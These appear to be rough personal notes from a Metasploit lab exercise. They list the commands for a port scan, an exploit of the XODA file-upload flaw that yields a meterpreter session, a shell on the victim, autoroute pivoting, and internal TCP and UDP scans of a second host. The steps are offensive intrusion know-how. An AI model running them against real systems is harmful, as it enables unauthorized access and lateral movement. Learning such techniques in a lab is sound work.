- service postgresql start && msfconsole
- workspace -a port_scan
- search portscan
-  use (...) tcp scan ?
- show options 
- set rhosts 
- set ports 

- curl IP 
- xoda
- search xoda 
- use xoda_file_upload
- set rhosts 
- set targeturi /

now for get  meterpter session in victim machinewe want to look for other machines in the same network 
meterpter 
- sysinfo
- shell
- /bin/bash -i 
- ifconfig 
- run autoroute -s 192.168.0.2
- background
- sessions
- seaarch port scan  
- tcp scan 
- set rhosts 192.168.0.3 ( victim inside victim)
- we get open ports
- search udp_sweep to get open udp scan 
- 